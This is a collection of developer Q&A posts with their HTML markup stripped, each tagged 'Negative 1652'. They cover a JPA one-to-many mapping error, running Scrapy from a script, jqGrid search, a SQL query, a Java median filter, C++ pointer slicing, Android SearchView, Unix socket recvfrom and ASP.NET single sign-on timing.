Negative 1652 pHello database experts,p  pConsider the following tablesp  precodeCREATE TABLE customers      id INTEGER NOT NULL PRIMARY KEY,     name VARCHAR100 NOT NULL,     orderid INTEGER NOT NULL,     CONSTRAINT customersibfk1 FOREIGN KEY orderid REFERENCES   orders id ON DELETE CASCADE,   CREATE TABLE orders      id INTEGER NOT NULL PRIMARY KEY,     date VARCHAR100 NOT NULL,     ...  codepre  pSince most of my queries and needs in the application just require accessing the orders associated with a customer, I decided to go for a unidirectional Onetomany mapping from Customers to Orders, as multiple orders can be associated with a customer. I arranged the entity classes as followsp  precodepublic class Customer implements Serializable  ...     OneToManycascade  CascadeType.ALL, fetch  FetchType.LAZY     JoinColumnname  id, referencedColumnName  orderid     private SetltOrdergt   orders ....  codepre  pIt compiles fine using JPA 2.0 and OpenJPA 2.4.0.

See the nested exceptions for details on the errors that occurred.] with root cause  org.apache.openjpa.persistence.ArgumentException You cannot join on column customers.orderid.  It is not managed by a mapping that supports joins. codepre  pWhen I looked around, looks like it is known bug a hrefhttpsissues.apache.orgjirabrowseOPENJPA1607 relnofollowhttpsissues.apache.orgjirabrowseOPENJPA1607a . p  pDid I miss anything here or does this mapping look okay To get around this issue, I have 2 approaches as far as I can seep  ol liMake the mapping bidirectional. However, as I read, in OneToMany bidirectional mapping, the ManyToOne is the owner. So in this case, the orders table will be the owner, which really isnt the case from a design perspective. There will be no orders, without a customer.li liAdd a ManyToOne unidirectional mapping from orders to customers table and for any queries for all the orders for a particular customer, just query the orders table with the customer id. Of course, this will mean multiple queries for what should have been a single query.li ol  pSo my question around the design is which approach do you think is cleaner and more efficient Is there a better different approach altogether Is there any performance or any other benefits of using unidirectional mapping instead of bidirectional mapping I looked around, but could not find many articles on it. Not sure if I missed it. If there are not many benefits, then I may be better off with approach 1.p  pI apologize if I missed something. Any pointers are greatly appreciated. Thank you for your time in advance.p  pthanks,p  pAlicep

Negative 1652 pI have written a crawl spider within a scrapy project that properly scrapes data from a url and the pipelines the response into a postgresql table, but only when the emscrapy crawlem command is used. When the spider is run from a script in the root directory of the project, it appears that only the parse method of the spider class is being called as the table is not being created upon running the script simply using the python command. I think the problem is that the crawl command has a specific protocol for looking for and calling specific modules in the directory above the spiders package e.g. the models, pipelines, and settings modules which arent being called when the spider is run from a script.p  pI followed the directions included in the a hrefhttpdoc.scrapy.orgenlatesttopicspractices.html relnofollowdocsa but they dont seem to address pipelining data after it is scraped. This raises the question of I should even be trying to run a script to run the spider or if I should just use the scrapy crawl command somehow.

I would also need to pass the text from the form to be added to the spider url  I was previously just using rawinput to create the url.

Negative 1652 pI would like to have searching for multiple fields simultaneously, but the popup and the advanced layout of Advanced Searching dont work for my requirements.

Also, as I send a custom XML request which contains the search criteria, I dont need the automatic passing of the search parameters in the URL by jqGrid, but on the other hand I still need the more codefree way of composing the search fields, filling of select inputs, input validation etc. which could be achieved with jqGrid. I need also to be able to showhide the form with the search fields using a button. Is all or part of this achievable with some modification of Advanced Searching or Toolbar Searching, or I should go completely the way of Custom Searching If, in order to have the proper layout I have to go for Custom Searching, could I still use jqGrid for filling select inputs, input validation etc.p

Negative 1652 pI currently have a query that lookups the number of downloads for a product and its dot releases . for the current month. Every time there is a new product andor a new version I have to add to the query which of course is susceptible to being forgotten about especially if Im no longer there to update it.p  pI setup this a hrefhttpsqlfiddle.com9570e86 relnofollowSQLFiddleap  pI have product, productrelease and log tables which are pretty self explanatory, the log table logs when someone downloads a product release. productrelease are the releases of the product.p  pSo my question is there a better way to do this Im sure since I am naming the fields that the current query would have to be thrown away and done in a different manner. Im not opposed to it, I could have the server side language process the query in a dynamic fashion too. Im wanting to have a query that I dont have to manage, server side processing to be optional and avoided if possible.p

Does anyone know where I am going wrong p  pTest input that works 2, 6, 80, 3, 1 and produces correctly 2,6,6,3,1p  precode median filter code public class MedianFilter extends RecursiveAction       filter class variables     float[] numbers     int filter     int window     int length     int lo     int hi      sequential cutoff set to predetermined value     static final int SEQUENTIALCUTOFF  500      array used for recursive calls in parallel code     float[] filtered      float[] result      public MedianFilterfloat[] numbers, int filter, int lo, int hi          this.numbers  numbers         this.filter  filter         this.lo  lo         this.hi  hi         length  numbers.length          the section of floats to be filtered median section         window  filter  1  2           protected void compute          filtered  new float[length]         result  new float[length]          if hi  lo lt SEQUENTIALCUTOFF              for int a  lo a lt hi a                   iterate window through all elements of the array                 for int i  0 i lt length i                       fetch boundary elements                     if i lt window  i gt length  window                          result[i]  numbers[i]                                           fetch elements within filter window                     else                          for int j  0 j lt filter j                              filtered[j]  numbers[i  window  j]                                                   order elements                         for int j  0 j lt filtered.length  2 j                               get the position of the smallest float                             int min  j                             for int k  j  1 k lt filter k                                  if filtered[k] lt filtered[min]                                      min  k                                                                   reorder array for minimum element                                 float temp  filtered[j]                                 filtered[j]  filtered[min]                                 filtered[min]  temp                                                           result                             result[i]  filtered[window]                                                                                        else               MedianFilter left  new MedianFilterfiltered, filter, lo, hi  lo  2             MedianFilter right  new MedianFilterfiltered, filter, hi  lo  2, hi             left.fork             right.compute             left.join                codepre

Negative 1652 pOkay, so my situation is really complex to a relativity new person to C like me. Im making a game AGK library and I have a framework class that is the base class for all of the games objects to have standard functions like codeframeEventcode and such that are to be overwritten by the child object.p  pThats all fine and dandy, and Ive gotten about 70 through development, but I ran across one vital problem.p  pTo make life easier while processing the game, each object that is a part of the game is just a pointer in a vector of type Framework. Framework being the base class. I was told that making it a pointer allows me to have child objects of different types as long as theyre a pointer as well. So far its worked out.p  pEvery frame, the global object runs through the vector of all the objects and runs their p  ol licodeframeEventcodeli licodeframeEndEventcode  Cant be overridenli licodedrawEventcodeli ol  pTheyre really just functions. So in the enemys bullet class, I need to check if it collides with codeoPlayercode, so I have a functions in the global class The global class is passed to the objects in their frame event so they can communicate with other objects. that grabs a given object.p  pIt searches through all of the objects to find the parameter object  so if I pass codenew oPlayercode, it will return the real codeoPlayercode pointer in the game.p  pWhen the bullet collides with the player, it needs to lower the players health and then destroy itself. So at the create function for the bullet, it creates a dummy player then locates the real one using the global class function. The code isp  precodeFind the player oPlayer tempPlayer  new oPlayer playerChecker  ObjGlobalgtclassToObjecttempPlayer tempPlayergtobjectDestroy codepre  pThat code works, but it needs codeplayerCheckercode to be type Framework because thats what codeclassToObjectcode returns. But when I later use that pointer, I cant access the players members even though thats the players pointer.     playerCheckerhitPoints codehitPointscode is exclusive to codeoPlayercode. I think its called object splicing or slicing, but I thought thats what using pointers fixed.p  pSo I tried to make codeplayerCheckercode type oPlayer, but it says that Framework cant be converted to it. So I have no idea what to do.p  pAny help is greatly appreciated.p

Negative 1652 pI am trying to implement a search widget to my app. The app got multiple tabs, the search widget should only be part of one. When a user enters another tab, I hide the search widget using p  precodemenu.findItem R.id.actionsearch .setVisiblefalse codepre  pHow ever, if the user enters a search string, then changes to a nonsearch widget tab, does some random stuff, and then finally switches back to the search widget fragment, I would like to show his last search with expanded edit text from the search widget.p  pSo far the filter is working, the search string remains the same, the search icon gets shown again, but however, the edit text for entering the search string is not shown by default. I tried to open it manually by using p  precodeMenuItemCompat.setShowAsActionsearchBar, MenuItemCompat.SHOWASACTIONALWAYS MenuItemCompat.expandActionViewsearchBar codepre  pBut this has not the wanted effect. I also tried p  precodesearchView.setIconifiedfalse codepre  pbut this also wont show the edit text during the recreation of the action view.p

Negative 1652 pI have two daemons one client and one server that communicate thru unix domain sockets local sockets. The problem I encounter is that the first time a datagram is received in the server with the function recvfrom then the client address provided by the recvfrom function is empty. However the size of the client address provided seems to be correct.

Negative 1652 pWere integrating with a single signon interface which provides a very nice remote JavaScript call to retrieve user information.  The library we reference via a remote URL even changes the state of the loginlogout links and provides a bit of user data their name and whatnot when they have already authenticated.  The resource returns a Json object which we parse, and then update the session state within our app to maintain their user information.p  pOur issue is that ASP.NET serves the HTML and completes its Page Load eventweb forms before the JavaScript object has been called and completed, and more importantly before the data is returned and the Ajax call is made to the server to update session.  The result is an onpage flash caused by JavaScript it starts off as logged out and then switches to logged in once the script has finished and pages that load in an incorrect state causing us to redirect the user needlessly.p  pHas anyone every played with preventing the page from loading prior to that remote script completing  I know we can hide the body content until the script has finished, which will eliminate the flashing and create an annoying wait for our users, but that wont eliminate our latent session issue.p  pAny ideas Thanks in advance.p  pBDp
